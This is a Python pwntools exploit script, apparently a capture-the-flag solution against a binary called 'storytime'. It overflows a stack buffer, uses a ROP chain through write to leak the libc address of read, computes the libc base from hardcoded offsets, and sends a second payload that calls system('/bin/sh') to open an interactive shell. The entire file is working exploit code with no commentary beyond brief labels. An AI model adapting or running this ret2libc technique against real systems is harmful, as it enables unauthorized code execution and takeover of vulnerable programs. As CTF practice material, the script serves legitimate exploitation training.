#!/usr/bin/env python3

from pwn import *

# Connect
elf = ELF('./storytime')
libc = ELF('./libc6_2.31-6_amd64.so')
p = process('./storytime')

# Addresses from the binary
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_got = elf.got['read']

# Gadgets to use
pop_rdi = 0x0000000000400703
pop_rsi_r15 = 0x0000000000400701
pop_rdx = 0

# Payload to call write
payload = b'A'*(0x30+8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got)*2
payload += p64(write_plt)
payload += p64(main_addr)

p.sendlineafter(": \n", payload)

# Leaking the address
#leak = hex(u64(p.recvuntil('story')[:8]))
#print(leak)

# Offsets from the libc library
read_libc_offset = 0xeee20
system_libc_offset = 0x48df0
bin_sh_libc_offset = 0x18a156

# Finding libc base
libc_base = u64(p.recvuntil('story')[:8]) - read_libc_offset
print('libc_base: {}'.format(hex(libc_base)))

# System and bin/sh addresses
system_addr = libc_base + system_libc_offset
bin_sh = libc_base + bin_sh_libc_offset

# Final payload to overflow the buffer
payload = b'A'*(0x30+8)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system_addr)

p.sendlineafter(': \n', payload)
p.interactive()
